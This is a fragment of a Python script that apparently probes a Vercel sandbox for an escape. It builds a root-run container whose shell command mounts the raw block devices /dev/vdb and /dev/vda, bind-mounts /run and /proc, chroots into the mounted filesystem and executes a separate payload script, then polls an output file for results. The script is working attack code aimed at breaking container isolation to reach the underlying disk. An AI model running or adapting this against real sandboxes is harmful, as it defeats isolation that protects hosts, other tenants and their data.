...
PAYLOAD = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vda80_probe_guest.py'), 'rb').read()
...
def make_spec(cid, with_pid_ns):
    ...
    spec = {
        ...
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c",
                     "echo V66_START $$ > /tmp/v80c.out 2>&1;"
                     "mkdir -p /mnt/g/run /mnt/g/proc /mnt/g/mnt/h;"
                     "timeout 8 mount /dev/vdb /mnt/g 2>&1;"
                     "M_RC=$?;"
                     "echo VDB_RC=$M_RC >> /tmp/v80c.out;"
                     "echo VDB_RC=$M_RC >> /mnt/g/vercel/sandbox/v80c.out 2>&1;"
                     "if [ $M_RC -eq 0 ]; then"
                     " mount --bind /run /mnt/g/run 2>&1; echo BIND_RUN=$? >> /mnt/g/vercel/sandbox/v80c.out;"
                     " mount --bind /proc /mnt/g/proc 2>&1; echo BIND_PROC=$? >> /mnt/g/vercel/sandbox/v80c.out;"
                     " timeout 8 mount /dev/vda /mnt/g/mnt/h 2>&1; echo VDA_RC=$? >> /mnt/g/vercel/sandbox/v80c.out;"
                     " /sbin/chroot /mnt/g /usr/bin/python3 /vercel/sandbox/v80_payload.py "
                     ">> /mnt/g/vercel/sandbox/v80c.out 2>&1;"
                     " echo CHROOT_RC=$? >> /mnt/g/vercel/sandbox/v80c.out;"
                     "fi;"
                     "echo V66_END >> /mnt/g/vercel/sandbox/v80c.out 2>&1;"
                     "sleep 99999"],
...
def run_container(CSP, sk, with_pid_ns):
    CID = 'v80a' if with_pid_ns else 'v80b'
...
def main():
    ...
    pf = '/vercel/sandbox/v80_payload.py'
    try:
    ...
    while t_wait < 60 and not done:
        ...
        try:
            ...
            if cur != seen:
                seen = cur
                log('--- COW v80c.out @%ds ---\n%s' % (t_wait, cur[-4000:]))
            if 'V80C_DONE' in cur or 'V66_END' in cur:
                done = True
        except Exception as e:
